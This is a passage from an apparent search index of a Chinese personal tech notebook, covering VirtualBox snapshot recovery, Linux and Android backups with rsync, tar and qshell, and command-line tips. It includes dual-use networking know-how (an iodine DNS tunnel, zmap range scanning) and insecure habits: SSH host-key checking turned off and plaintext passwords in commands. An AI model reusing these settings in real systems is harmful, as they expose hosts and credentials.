\uff0c\u601d\u8def\u662f\u521b\u5efa\u4e2a\u65b0\u7684\u865a\u62df\u673a \u4ecebase vdi\u5f00\u59cb\u6253\u5feb\u7167->\u7f16\u8f91vbox\u5c06\u65b0\u7684Snapshot\u6307\u5411\u4e0b\u4e00\u4e2a\u5feb\u7167->\u7ee7\u7eed\u6253\u5feb\u7167\u91cd\u590d \u5176\u4e2d\u5c31\u9700\u8981\u6211\u4eec\u641e\u6e05\u695a\u5feb\u7167\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u770b\u6587\u4ef6\u4fee\u6539\u7684\u65f6\u95f4\u6233\u5dee\u4e0d\u591a\u53ef\u4ee5\u77e5\u9053\uff0c\u4f46\u5982\u679c\u6ca1\u6709\u8fd9\u79cd\u4fe1\u606f\u4e5f\u4e0d\u5fc5\u6309\u7167\u4eba\u5bb6\u8bf4\u7684\u4e00\u4e2a\u4e2a\u52a0\u8f7d\u5c1d\u8bd5\uff0c\u53ef\u4ee5\u4f7f\u7528 \u8fd9\u7bc7 \u8bf4\u5230\u7684 VBoxManage internalcommands dumphdinfo \u6765\u67e5\u770b\u6bcf\u4e2a\u5feb\u7167\u6587\u4ef6\u7684parent\u662f\u8c01\u3002","title":"\u4ece\u786c\u76d8+\u5feb\u7167vdi\u6587\u4ef6\u6062\u590d"},{"location":"Linux-backup/","text":"\u5907\u4efd \u5907\u4efd \u5907\u4efd\uff01 \u00b6 \u4e00\u4e2a\u826f\u597d\u5b89\u5168\u7684\u5907\u4efd\u8ba1\u5212\u81f3\u5173\u91cd\u8981\uff0c\u5907\u4efd\u811a\u672c\u5e94\u8be5\u5bfc\u51fa\u6570\u636e\u5e93\u3001\u538b\u7f29\u65e5\u5fd7\u548c\u52a8\u6001\u4ea7\u751f\u7684\u6570\u636e\u6587\u4ef6\uff0c\u52a0\u5bc6\u540e\u4e0a\u4f20\u81f3\u5176\u4ed6\u670d\u52a1\u5668\u6216CDN Demo \u00b6 \u4e0b\u9762\u7684\u4f8b\u5b50\u6d89\u53ca\u5230date\u3001docker\u3001tar\u3001zip\u3001\u4e03\u725bqshell\u547d\u4ee4\u7684\u4f7f\u7528 # !/bin/bash pushd \u5de5\u4f5c\u76ee\u5f55 d = ` date +%Y%m%d ` mkdir bakup $d cd bakup $d ( docker exec \u5bb9\u5668\u540d\u79f0 mysqldump -p\u5bc6\u7801 \u6570\u636e\u5e93\u540d\u79f0 ) >database.sql tar cvzf log.tar.gz ../log # \u538b\u7f29log\u76ee\u5f55 cd ../ # \u4f7f\u7528zip\u52a0\u5bc6\u538b\u7f29\uff0c\u538b\u7f29\u540e\u5220\u9664\u539f\u6587\u4ef6 zip -r -P \u538b\u7f29\u5bc6\u7801 -m bakup $d .zip bakup $d / # \u4f7f\u7528\u4e03\u725b\u7684qshell\u4e0a\u4f20\u5907\u4efd\u6587\u4ef6\uff0c\u8fd0\u884c\u524d\u9700\u8981\u914d\u7f6e\u8d26\u53f7qshell account \u4f60\u7684AK \u4f60\u7684SK # \u4e0b\u9762\u8fd9\u6761\u547d\u4ee4\u8868\u793a\u5c06bakup$d.zip\u4e0a\u4f20\uff0cCDN\u4e0a\u5b58\u50a8\u7684\u6587\u4ef6\u540d\u4e3a$d.zip ./qshell fput \u4f60\u7684bucket\u7684\u540d\u79f0 $d .zip bakup $d .zip # \u5982\u679c\u4f60\u653e\u5fc3\u53ef\u4ee5\u672c\u5730\u5f7b\u5e95\u5220\u6389\u5907\u4efd\u6587\u4ef6\uff1a # rm -r bakup$d.zip \u7528rsync\u4ee3\u66ffscp \u00b6 rsync\u53ef\u4ee5\u65ad\u70b9\u7eed\u4f20\uff0c\u4e0d\u5982\u5c31\u7528rsync\u4ee3\u66ffscp \u53c2\u8003\uff1a https://www.digitalocean.com/community/tutorials/how-to-copy-files-with-rsync-over-ssh \u9996\u5148\u9700\u8981ssh-keygen\u751f\u6210id_rsa,\u628aid_rsa.pub\u7684\u5185\u5bb9\u590d\u5236\u5230\u76ee\u6807\u673a\u5668\u7684~/.ssh/authorized_keys \u5728\u9700\u8981\u4f7f\u7528scp -r\u7684\u5730\u65b9\u6539\u4e3arsync -avz -e \u201cssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u201d \u2013progress tar\u5907\u4efd\u6574\u4e2a\u7cfb\u7edf \u00b6 \u6bd4\u5982\u901a\u8fc7\u8fdc\u7a0bssh\u7684\u65b9\u5f0f\u4e0b\u8f7d\u5230\u670d\u52a1\u5668\u7684\u6574\u4e2a\u6839\u76ee\u5f55\u6253\u5305\uff1a ssh server tar -cvpz --one-file-system / > server_backup.tar.gz \u5176\u4e2d\uff1a c \u521b\u5efa v \u538b\u7f29\u65f6\u663e\u793a\u8be6\u60c5 \u5f53\u524d\u5904\u7406\u7684\u6587\u4ef6 p preserve-permissions\u4fdd\u7559\u6743\u9650\u4fe1\u606f z \u4f7f\u7528gzip\u538b\u7f29 \u4f7f\u7528rsync\u50cftime machine\u4e00\u6837\u5168\u76d8\u5907\u4efd \u00b6 https://github.com/laurent22/rsync-time-backup \u4f8b\u5982\u5c06Linux\u670d\u52a1\u5668\u591a\u4e2a\u786c\u76d8\u6240\u6709\u6587\u4ef6\u5907\u4efd\u5230/nas/hostname\u4e0b\u9762 \u5148\u4ecegithub\u4e0b\u8f7d\u8fd9\u4e2a rsync_tmbackup.sh \u6587\u4ef6\uff0c\u5220\u6389\u5176\u4e2d\u7684 --one-file-system \uff0c\u653e\u5165/nas\u76ee\u5f55 \u5c06\u9700\u8981\u5ffd\u7565\u7684\u76ee\u5f55\u5199\u6210/nas/rsync_ignore.txt\uff0c\u4f8b\u5982\uff1a\uff08\u6ce8\u610f\u5ffd\u7565\u4e86/mnt\uff09 - /boot - /dev - /lost+found - /media - /mnt - /nas - /nfs - /proc - /snap - /sys - /tmp \u7136\u540e\u5c31\u6267\u884c\u5457\uff1a mkdir -p /nas/hostname touch /nas/hostname/backup.marker /nas/rsync_tmbackup.sh / /nas/hostname/ /nas/rsync_ignore.txt \u597d\u5904\u662f\u4e0d\u7528\u81ea\u5df1\u6784\u9020rsync\u5404\u79cd\u590d\u6742\u7684\u53c2\u6570\uff0c\u5907\u4efd\u7684\u6548\u679c\u662f\u6bcf\u6b21\u5907\u4efd\u90fd\u4f1a\u4ea7\u751f\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u4f46\u4e0a\u6b21\u5907\u4efd\u65f6\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\u53ea\u4f1a\u505a\u786c\u94fe\u63a5 rsync\u5907\u4efd\u5230\u975eroot\u7528\u6237\u7684\u76ee\u6807\u673a\u5668\u4e0a \u00b6 \u53c2\u8003\uff1a https://serverfault.com/questions/755753/preserve-ownership-with-rsync-without-root \u5168\u76d8\u5907\u4efd\u5e0c\u671b\u80fd\u4fdd\u7559\u6587\u4ef6\u7684\u5c5e\u6027\uff0c\u5982\u679c\u76ee\u6807\u4f4d\u7f6e\u6ca1\u6709root\u7528\u6237\u5219\u4e0d\u80fd\u76f4\u63a5\u4fdd\u7559\uff0crsync\u63d0\u4f9b\u4e86 --fake-super \u8fd9\u4e2a\u9009\u9879 \u8fd9\u4e2a --fake-super \u9009\u9879\u542f\u7528\u540e\uff0crsync\u4f1a\u628a\u5c5e\u6027\u4ee5\u7279\u6b8a\u62d3\u5c55\u5c5e\u6027\u7684\u65b9\u5f0f\u5b58\u50a8\uff0c\u6062\u590d\u7684\u65f6\u5019rsync\u4f1a\u5229\u7528\u8fd9\u4e2a\u5c5e\u6027\u8fdb\u884c\u6062\u590d rsync\u5907\u4efd\u5b89\u5353\u624b\u673a \u00b6 \u53c2\u8003\uff1a http://ptspts.blogspot.com/2015/03/how-to-use-rsync-over-adb-on-android.html \u9996\u5148\u4fdd\u8bc1\u624b\u673a\u7684usb\u8c03\u8bd5\u5f00\u542f\u4e86\uff0cadb shell\u80fd\u8fdb\u5165\u624b\u673a\uff0c\u5728Linux\u4e3b\u673a\u4e0a\u6267\u884c\uff1a # \u5c06rsync\u4e8c\u8fdb\u5236\u53d1\u7ed9\u624b\u673a wget - O rsync . bin http : // github . com / pts / rsyncbin / raw / master / rsync . rsync4android adb push rsync . bin / data / local / tmp / rsync adb shell chmod 755 / data / local / tmp / rsync adb shell / data / local / tmp / rsync -- version # \u5728\u5b89\u5353\u4e0a\u542f\u52a8rsync server \u76d1\u542c\u57281873\u7aef\u53e3 \uff0c \u8f6c\u53d1\u5230Linux\u76846010\u7aef\u53e3 adb shell 'exec >/sdcard/rsyncd.conf && echo address = 127.0.0.1 && echo port = 1873 && echo \"[root]\" && echo path = / && echo use chroot = false && echo read only = false' adb shell / data / local / tmp / rsync -- daemon -- no - detach -- config =/ sdcard / rsyncd . conf -- log - file =/ proc / self / fd / 2 # \u518d\u542f\u52a8\u4e00\u4e2a\u7ec8\u7aef\u7ee7\u7eed adb forward tcp : 6010 tcp : 1873 # \u590d\u5236\u6574\u4e2a / sdcard\u76ee\u5f55 rsync - avzP --stats rsync://localhost:6010/root/sdcard/ .","title":"Linux-backup"},{"location":"Linux-backup/#_1","text":"\u4e00\u4e2a\u826f\u597d\u5b89\u5168\u7684\u5907\u4efd\u8ba1\u5212\u81f3\u5173\u91cd\u8981\uff0c\u5907\u4efd\u811a\u672c\u5e94\u8be5\u5bfc\u51fa\u6570\u636e\u5e93\u3001\u538b\u7f29\u65e5\u5fd7\u548c\u52a8\u6001\u4ea7\u751f\u7684\u6570\u636e\u6587\u4ef6\uff0c\u52a0\u5bc6\u540e\u4e0a\u4f20\u81f3\u5176\u4ed6\u670d\u52a1\u5668\u6216CDN","title":"\u5907\u4efd \u5907\u4efd \u5907\u4efd\uff01"},{"location":"Linux-backup/#demo","text":"\u4e0b\u9762\u7684\u4f8b\u5b50\u6d89\u53ca\u5230date\u3001docker\u3001tar\u3001zip\u3001\u4e03\u725bqshell\u547d\u4ee4\u7684\u4f7f\u7528 # !/bin/bash pushd \u5de5\u4f5c\u76ee\u5f55 d = ` date +%Y%m%d ` mkdir bakup $d cd bakup $d ( docker exec \u5bb9\u5668\u540d\u79f0 mysqldump -p\u5bc6\u7801 \u6570\u636e\u5e93\u540d\u79f0 ) >database.sql tar cvzf log.tar.gz ../log # \u538b\u7f29log\u76ee\u5f55 cd ../ # \u4f7f\u7528zip\u52a0\u5bc6\u538b\u7f29\uff0c\u538b\u7f29\u540e\u5220\u9664\u539f\u6587\u4ef6 zip -r -P \u538b\u7f29\u5bc6\u7801 -m bakup $d .zip bakup $d / # \u4f7f\u7528\u4e03\u725b\u7684qshell\u4e0a\u4f20\u5907\u4efd\u6587\u4ef6\uff0c\u8fd0\u884c\u524d\u9700\u8981\u914d\u7f6e\u8d26\u53f7qshell account \u4f60\u7684AK \u4f60\u7684SK # \u4e0b\u9762\u8fd9\u6761\u547d\u4ee4\u8868\u793a\u5c06bakup$d.zip\u4e0a\u4f20\uff0cCDN\u4e0a\u5b58\u50a8\u7684\u6587\u4ef6\u540d\u4e3a$d.zip ./qshell fput \u4f60\u7684bucket\u7684\u540d\u79f0 $d .zip bakup $d .zip # \u5982\u679c\u4f60\u653e\u5fc3\u53ef\u4ee5\u672c\u5730\u5f7b\u5e95\u5220\u6389\u5907\u4efd\u6587\u4ef6\uff1a # rm -r bakup$d.zip","title":"Demo"},{"location":"Linux-backup/#rsyncscp","text":"rsync\u53ef\u4ee5\u65ad\u70b9\u7eed\u4f20\uff0c\u4e0d\u5982\u5c31\u7528rsync\u4ee3\u66ffscp \u53c2\u8003\uff1a https://www.digitalocean.com/community/tutorials/how-to-copy-files-with-rsync-over-ssh \u9996\u5148\u9700\u8981ssh-keygen\u751f\u6210id_rsa,\u628aid_rsa.pub\u7684\u5185\u5bb9\u590d\u5236\u5230\u76ee\u6807\u673a\u5668\u7684~/.ssh/authorized_keys \u5728\u9700\u8981\u4f7f\u7528scp -r\u7684\u5730\u65b9\u6539\u4e3arsync -avz -e \u201cssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u201d \u2013progress","title":"\u7528rsync\u4ee3\u66ffscp"},{"location":"Linux-backup/#tar","text":"\u6bd4\u5982\u901a\u8fc7\u8fdc\u7a0bssh\u7684\u65b9\u5f0f\u4e0b\u8f7d\u5230\u670d\u52a1\u5668\u7684\u6574\u4e2a\u6839\u76ee\u5f55\u6253\u5305\uff1a ssh server tar -cvpz --one-file-system / > server_backup.tar.gz \u5176\u4e2d\uff1a c \u521b\u5efa v \u538b\u7f29\u65f6\u663e\u793a\u8be6\u60c5 \u5f53\u524d\u5904\u7406\u7684\u6587\u4ef6 p preserve-permissions\u4fdd\u7559\u6743\u9650\u4fe1\u606f z \u4f7f\u7528gzip\u538b\u7f29","title":"tar\u5907\u4efd\u6574\u4e2a\u7cfb\u7edf"},{"location":"Linux-backup/#rsynctime-machine","text":"https://github.com/laurent22/rsync-time-backup \u4f8b\u5982\u5c06Linux\u670d\u52a1\u5668\u591a\u4e2a\u786c\u76d8\u6240\u6709\u6587\u4ef6\u5907\u4efd\u5230/nas/hostname\u4e0b\u9762 \u5148\u4ecegithub\u4e0b\u8f7d\u8fd9\u4e2a rsync_tmbackup.sh \u6587\u4ef6\uff0c\u5220\u6389\u5176\u4e2d\u7684 --one-file-system \uff0c\u653e\u5165/nas\u76ee\u5f55 \u5c06\u9700\u8981\u5ffd\u7565\u7684\u76ee\u5f55\u5199\u6210/nas/rsync_ignore.txt\uff0c\u4f8b\u5982\uff1a\uff08\u6ce8\u610f\u5ffd\u7565\u4e86/mnt\uff09 - /boot - /dev - /lost+found - /media - /mnt - /nas - /nfs - /proc - /snap - /sys - /tmp \u7136\u540e\u5c31\u6267\u884c\u5457\uff1a mkdir -p /nas/hostname touch /nas/hostname/backup.marker /nas/rsync_tmbackup.sh / /nas/hostname/ /nas/rsync_ignore.txt \u597d\u5904\u662f\u4e0d\u7528\u81ea\u5df1\u6784\u9020rsync\u5404\u79cd\u590d\u6742\u7684\u53c2\u6570\uff0c\u5907\u4efd\u7684\u6548\u679c\u662f\u6bcf\u6b21\u5907\u4efd\u90fd\u4f1a\u4ea7\u751f\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u4f46\u4e0a\u6b21\u5907\u4efd\u65f6\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\u53ea\u4f1a\u505a\u786c\u94fe\u63a5","title":"\u4f7f\u7528rsync\u50cftime machine\u4e00\u6837\u5168\u76d8\u5907\u4efd"},{"location":"Linux-backup/#rsyncroot","text":"\u53c2\u8003\uff1a https://serverfault.com/questions/755753/preserve-ownership-with-rsync-without-root \u5168\u76d8\u5907\u4efd\u5e0c\u671b\u80fd\u4fdd\u7559\u6587\u4ef6\u7684\u5c5e\u6027\uff0c\u5982\u679c\u76ee\u6807\u4f4d\u7f6e\u6ca1\u6709root\u7528\u6237\u5219\u4e0d\u80fd\u76f4\u63a5\u4fdd\u7559\uff0crsync\u63d0\u4f9b\u4e86 --fake-super \u8fd9\u4e2a\u9009\u9879 \u8fd9\u4e2a --fake-super \u9009\u9879\u542f\u7528\u540e\uff0crsync\u4f1a\u628a\u5c5e\u6027\u4ee5\u7279\u6b8a\u62d3\u5c55\u5c5e\u6027\u7684\u65b9\u5f0f\u5b58\u50a8\uff0c\u6062\u590d\u7684\u65f6\u5019rsync\u4f1a\u5229\u7528\u8fd9\u4e2a\u5c5e\u6027\u8fdb\u884c\u6062\u590d","title":"rsync\u5907\u4efd\u5230\u975eroot\u7528\u6237\u7684\u76ee\u6807\u673a\u5668\u4e0a"},{"location":"Linux-backup/#rsync","text":"\u53c2\u8003\uff1a http://ptspts.blogspot.com/2015/03/how-to-use-rsync-over-adb-on-android.html \u9996\u5148\u4fdd\u8bc1\u624b\u673a\u7684usb\u8c03\u8bd5\u5f00\u542f\u4e86\uff0cadb shell\u80fd\u8fdb\u5165\u624b\u673a\uff0c\u5728Linux\u4e3b\u673a\u4e0a\u6267\u884c\uff1a # \u5c06rsync\u4e8c\u8fdb\u5236\u53d1\u7ed9\u624b\u673a wget - O rsync . bin http : // github . com / pts / rsyncbin / raw / master / rsync . rsync4android adb push rsync . bin / data / local / tmp / rsync adb shell chmod 755 / data / local / tmp / rsync adb shell / data / local / tmp / rsync -- version # \u5728\u5b89\u5353\u4e0a\u542f\u52a8rsync server \u76d1\u542c\u57281873\u7aef\u53e3 \uff0c \u8f6c\u53d1\u5230Linux\u76846010\u7aef\u53e3 adb shell 'exec >/sdcard/rsyncd.conf && echo address = 127.0.0.1 && echo port = 1873 && echo \"[root]\" && echo path = / && echo use chroot = false && echo read only = false' adb shell / data / local / tmp / rsync -- daemon -- no - detach -- config =/ sdcard / rsyncd . conf -- log - file =/ proc / self / fd / 2 # \u518d\u542f\u52a8\u4e00\u4e2a\u7ec8\u7aef\u7ee7\u7eed adb forward tcp : 6010 tcp : 1873 # \u590d\u5236\u6574\u4e2a / sdcard\u76ee\u5f55 rsync - avzP --stats rsync://localhost:6010/root/sdcard/ .","title":"rsync\u5907\u4efd\u5b89\u5353\u624b\u673a"},{"location":"Linux-cli/","text":"Linux\u547d\u4ee4\u884c\u64cd\u4f5c\u6280\u5de7 \u00b6 \u672c\u6587\u6863\u4e00\u822c\u4e0d\u6d89\u53caroot\u6743\u9650\uff0cLinux\u76f8\u5173\u7b14\u8bb0\u8fd8\u6709\uff1a Linux\u7cfb\u7edf\u914d\u7f6e SSH\u8fdc\u7a0b\u767b\u5f55 Linux\u5907\u4efd \u67e5\u770b\u5185\u7f6e\u547d\u4ee4\u7684\u5e2e\u52a9 \u00b6 \u5c06\u4ee5\u4e0b\u5185\u5bb9\u52a0\u5165 ~/.bashrc \u4e2d\u5373\u53ef\uff0c\u5224\u65ad\u5982\u679c\u5728\u5185\u7f6e\u547d\u4ee4\u5c31\u8c03\u7528help -m\uff0c\u4e0d\u662f\u5219\u7ed5\u5f00bash\u51fd\u6570\u6765\u8fd0\u884cman\u8fdb\u7a0b man () { case \" $( type -t -- \" $1 \" ) \" in builtin | keyword ) help -m \" $1 \" | sensible-pager ;; * ) command man \" $@ \" ;; esac } grep\u641c\u7d22\u5e2e\u52a9\u6587\u6863 \u00b6 \u7528\u4e24\u4e2a\u6a2a\u7ebf -- \u4f5c\u4e3agrep\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u4e0d\u8981\u628a\u5176\u540e\u9762\u7684\u5f62\u5982 -z \u7684\u53c2\u6570\u5f53\u6210grep\u7684\u53c2\u6570 \u4f8b\u5982\u6211\u60f3\u77e5\u9053tar\u547d\u4ee4\u4e2d\u7684-z\u662f\u4ec0\u4e48\u610f\u601d\uff1a man tar | grep -- -z \u5e2e\u52a9\u6587\u672c\u7684grep\uff0c\u628astderr\u91cd\u5b9a\u5411\u5230stdout \u00b6 \u67d0\u4e9b\u65f6\u5019\u5e2e\u52a9\u6587\u672c\u662f\u8f93\u51fa\u5230\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u7684\uff0c\u9700\u8981\u75282>&1\u8fd9\u6837\u7684\u91cd\u5b9a\u5411\u54af ssh-keygen --help 2>&1|grep bit \u5404\u79cd\u89e3\u538b\u547d\u4ee4 \u00b6 tar.gz\uff1a tar -zxvf xx.tar.gz tar.bz2\uff1a tar -jxvf xx.tar.bz2 zip\uff1a unzip xx.zip \u53c2\u6570\u542b\u4e49\uff1a -x\u89e3\u538b\uff0c-v\u8be6\u7ec6\u663e\u793a\u89e3\u538b\u51fa\u6765\u7684\u4e1c\u897f\uff08\u5982\u679c\u662f\u4e00\u4e2a\u590d\u6742\u7684\u538b\u7f29\u5305\u5efa\u8bae\u4e0d\u8981\u7528\u4ee5\u52a0\u5feb\u89e3\u538b\u901f\u5ea6\uff09\uff0c-f\u540e\u63a5\u538b\u7f29\u6587\u4ef6\u7684\u6587\u4ef6\u540d \u5f53\u524d\u76ee\u5f55\u6587\u4ef6\u5168\u6587\u641c\u7d22 \u00b6 \u8fd9\u91cc\u8981\u641c\u7d22\u5f53\u524d\u76ee\u5f55\u4e0b\u9762\u6240\u6709\u7684\u5305\u542b\u201dMultiTeam\u201d\u6587\u4ef6 grep MultiTeam -r . \u7edf\u8ba1\u5f53\u524d\u6587\u4ef6\u5939\u4ee3\u7801\u884c\u6570 \u00b6 find \u6307\u5b9a\u6587\u4ef6\u540e\u7f00\u540d\uff0c\u8bb0\u4f4f\u8981\u5f15\u53f7\u907f\u514dbash\u89e3\u6790* find -name \"*.py\" -o -name \"*.md\"|xargs cat|wc \u67e5\u770b\u7ed9\u5b9a\u6587\u4ef6\u5217\u8868\u7684\u6587\u4ef6\u5927\u5c0f \u00b6 \u7528xargs -d\u6307\u5b9a\u5206\u9694\u7b26\u4e3a\\n\uff08\u9ed8\u8ba4\u4f1a\u6309\u7167\u7a7a\u683c\u548c\\n\u5206\u9694\u53c2\u6570\uff09 cat list.txt | xargs -d \"\\n\" ls -alh wget\u6162\u6162\u4e0b\u8f7d \u00b6 wget -i list.txt -nc --wait=60 --random-wait \u5176\u4e2dnc\u8868\u793a\u5df2\u7ecf\u4e0b\u8f7d\u5230\u7684\u6587\u4ef6\u5c31\u4e0d\u8981\u518d\u8bf7\u6c42\u4e86\uff0cwait=60\u8868\u793a\u4e24\u6b21\u8bf7\u6c42\u95f4\u969460s\uff0crandom-wait\u8868\u793a\u968f\u673a\u7b49\u5f852~120s touch\u4fee\u6539\u65f6\u95f4\u6233 \u00b6 \u5c06b.txt\u7684\u65f6\u95f4\u6233\u6539\u4e3a\u548ca.txt\u4e00\u6837 touch -r a.txt b.txt \u53bb\u6389Ubuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0bls\u7684\u989c\u8272 \u00b6 unalias ls \u6216\u8005\u76f4\u63a5\u4f7f\u7528\uff1aCredits @rachpt \\ls \u540c\u7406\u4e5f\u53ef\u4ee5\u7ed5\u8fc7grep\u7684alias: \\grep \u6362\u884c\u65b9\u5f0f\u4fee\u6539 \u00b6 \u5982\u679c\u4e00\u4e2a\u6587\u4ef6\u6765\u81ea\u4e8eWindows\uff0c\u53ef\u80fd\u9700\u8981\u5148\u4fee\u6539\u6362\u884c\u65b9\u5f0f\u624d\u80fd\u7528\uff0c\u53bb\u6389\u6587\u4ef6\u4e2d\u7684\\r vim\u4e2d\u8f93\u5165 :set ff=unix iodine\u2013\u4f7f\u7528DNS\u4f20\u8f93\u6570\u636e \u00b6 http://code.kryo.se/iodine/ \u6ce8\u610f\uff1a \u672c\u65b9\u6848\u7f51\u901f\u6781\u4f4e\uff0c\u4f7f\u7528\u65f6\u8981\u6709\u8db3\u591f\u7684\u8010\u5fc3\uff0c\u4e0d\u80fd\u4fdd\u8bc1\u590d\u6742\u60c5\u51b5\u4e0b\u662f\u5426\u53ef\u884c\uff08\u5c24\u5176\u662fWindows\uff09 \u524d\u671f\u51c6\u5907\uff1a\u4e00\u4e2a\u57df\u540d\uff08\u5047\u8bbe\u4e3aexample.com\uff09\u53ca\u4e00\u53f0\u670d\u52a1\u5668\uff08\u5047\u8bbe\u4e3a1.2.3.4\uff09\uff0c\u5efa\u8bae\u5ba2\u6237\u7aef\u5728Linux\u4e0a\u8fd0\u884c 1. \u8bbe\u7f6e\u57df\u540d\u89e3\u6790 \u00b6 dns.example.com\u6dfb\u52a0\u4e00\u6761A\u8bb0\u5f55\uff0c\u89e3\u6790\u81f31.2.3.4 t.example.com\u6dfb\u52a0\u4e00\u6761NS\u8bb0\u5f55\uff0c\u503c\u4e3adns.example.com 2. \u670d\u52a1\u5668\u7aef \u00b6 ./iodined -f -c -P secretpassword 192.168.99.1 t.example.com -f\u8868\u793a\u6301\u7eed\u5360\u7528\u524d\u53f0\uff0c-c\u8868\u793a\u4e0d\u9650\u5236\u8bf7\u6c42\u6e90\uff0c-P\u6307\u5b9a\u5bc6\u7801\uff0c\u6700\u540e\u662f \u5185\u7f51IP \u548c\u4f7f\u7528\u7684\u57df\u540d \u5185\u7f51IP\u53ef\u4ee5\u968f\u610f\u6307\u5b9a\uff0c\u53ea\u8981\u5f53\u524d\u670d\u52a1\u5668\u6ca1\u6709\u5360\u7528\u5373\u53ef\uff0c\u4f8b\u5982\u53ef\u4ee5\u6539\u4e3a172.16.0.1 3.\u68c0\u67e5\u670d\u52a1\u7aef\u662f\u5426\u6b63\u5e38 \u00b6 http://code.kryo.se/iodine/check-it/ \u4f5c\u8005\u63d0\u4f9b\u4e86\u5728\u7ebf\u68c0\u67e5\u5de5\u5177\uff0c\u8f93\u5165t.example.com\u5373\u53ef\u68c0\u67e5 4.\u5ba2\u6237\u7aef \u00b6 \u5efa\u8bae\u5728ubuntu\u7b49\u5b8c\u6574\u7684Linux\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u8fd0\u884c\uff0c\u4e0b\u8f7d\u6e90\u7801\u540emake\u5373\u53ef ./iodine -f -P secretpassword t.example.com \u6548\u679c\u56fe\uff1a \u8fdc\u7a0b\u63a7\u5236Windows \u00b6 Windows\u4e0b\u6709\u81ea\u5e26\u7684mstsc\uff0cLinux\u5982\u6811\u8393\u6d3e\u7528\u5565\u5462\uff1f\u5c31\u7528 rdesktop \u5566 \u624b\u518c\u67e5\u8be2\u7528 man rdesktop \u5feb\u901f\u4f7f\u7528\uff1a sudo apt-get install -y rdesktop rdesktop -f -k en-us -C -N -z -xl -P -u \u7528\u6237\u540d -p \u5bc6\u7801 \u670d\u52a1\u5668\u5730\u5740:\u7aef\u53e3 \u5176\u4e2d-f\u8868\u793a\u5168\u5c4f\uff0c -k\u8bbe\u7f6e\u952e\u76d8\u5e03\u5c40\uff0c -C\u4f7f\u7528\u79c1\u6709\u989c\u8272\u8868\uff0c-N\u540c\u6b65NumLock\uff0c-z\u542f\u7528\u538b\u7f29\uff0c-xl \u8bbe\u7f6e\u4e3aLAN\u573a\u666f\uff0c-P\u4f7f\u7528bitmap\u7f13\u5b58 \u6ce8\u610f\u4e0a\u8ff0\u5728\u547d\u4ee4\u884c\u4e2d\u4f7f\u7528\u660e\u6587\u5bc6\u7801\u5e76\u4e0d\u5b89\u5168\uff0c\u53ef\u80fd\u88ab\u5176\u4ed6\u7528\u6237\u7528ps\u7b49\u5de5\u5177\u770b\u5230\uff0c\u5efa\u8bae\u4ec5\u4ec5\u5728\u5b8c\u5168\u81ea\u5df1\u63a7\u5236\u7684Linux\u4e0a\u7cfb\u7edf\u4e0a\u8fd9\u6837\u64cd\u4f5c \u7edf\u8ba1\u4ee5\u7279\u5b9a\u5b57\u7b26\u4e32\u5f00\u5934\u7684\u6587\u4ef6\u6570\u76ee \u00b6 awk\u662f\u4e2a\u5f88\u597d\u7528\u7684\u5de5\u5177\u5462\uff0c\u652f\u6301substr\u51fd\u6570\uff0c\u7528\u6cd5\u4e3asubstr(\u6e90\u5b57\u7b26\u4e32\uff0c\u5f00\u59cb\uff0c\u957f\u5ea6)\uff0c\u5176\u4e2d\u5f00\u59cb\u4ece1\u8ba1\u6570 ls -l \u957f\u5217\u8868\u663e\u793a\u7684\u8bdd\uff0c\u6309\u7a7a\u683c\u5206\u5c31\u662f$9 ls -l|awk '{if(substr($9,1,\u5b57\u7b26\u4e32\u957f\u5ea6)==\"\u4f60\u8981\u7684\u90a3\u4e2a\u5b57\u7b26\u4e32\") print $9}'|sort|uniq|wc -l hexdump\u67e5\u770b\u5b57\u7b26\u5185\u90e8\u7f16\u7801 \u00b6 echo\u7684-n\u53c2\u6570\u8868\u793a\u4e0d\u8981\u672b\u5c3e\u52a0\\n echo -n hello | hexdump -C \u5b50\u76ee\u5f55\u5927\u5c0f\u6392\u5e8f \u00b6 sort\u7684-h\u8868\u793a\u6309\u4eba\u7c7b\u7406\u89e3\u7684\u5927\u5c0f\u683c\u5f0f\u6392\u5e8f\uff0c-r\u8868\u793a\u9006\u5e8f du -sh * | sort -hr \u5b89\u88c5ffmpeg \u00b6 \u5728ubuntu14\u4e0b\u662f\u6ca1\u6709ffmpeg\u7684\u5b98\u65b9\u5305\u652f\u6301\u7684\uff0c\u9700\u8981\u6dfb\u52a0mc3man\u7684ppa sudo add-apt-repository ppa:mc3man/trusty-media #\u6309\u56de\u8f66\u7ee7\u7eed sudo apt-get update sudo apt-get install -y ffmpeg \u4fdd\u8bc1\u811a\u672c\u5b89\u5168\u6267\u884cset -ex \u00b6 set \u547d\u4ee4\u633a\u6709\u7528\u7684\u5462\uff0c-e\u8868\u793a\u5982\u679c\u540e\u9762\u7684\u8bed\u53e5\u8fd4\u56de\u4e0d\u4e3a0\u7acb\u523b\u7ed3\u675fshell\uff0c-x\u8868\u793a\u663e\u793a\u51fa\u6bcf\u6761\u547d\u4ee4\u53ca\u53c2\u6570 \u4ece \u4eba\u5bb6\u7684Dockerfile \u4e2d\u5b66\u4e60\u5f97\u6765 change readonly bash variable \u00b6 bash is a weird thing\u2026 declaring a variable as reference by using declare -n , we can change it! $ a = 1 $ readonly a $ a = 2 bash: a: readonly variable #Look here! $ declare -n a $ a = 2 $ echo $a 2 \u6c38\u4e45\u7b49\u5f85 sleep infinity \u00b6 \u6709\u65f6\u5199\u4e86\u4e00\u4e2ash\u6587\u4ef6\u540e\u9700\u8981\u4fdd\u6301\u8fd9\u4e2ash\u7684\u8fd0\u884c\uff0c\u5c31\u7528sleep\u6c38\u4e45\u7b49\u5f85\u597d\u54af sleep infinity zmap\u626b\u63cf\u6574\u4e2a\u7f51\u6bb5\u7279\u5b9a\u5f00\u653e\u7aef\u53e3 \u00b6 zmap\u7684\u8fd0\u884c\u9700\u8981root\u6743\u9650\uff0c\u7528 apt-get install zmap \u5373\u53ef\u5b89\u88c5 \u66f4\u8be6\u7ec6\u7684\u5e2e\u52a9\u53bb\u770b\u770b zmap --help \u54af 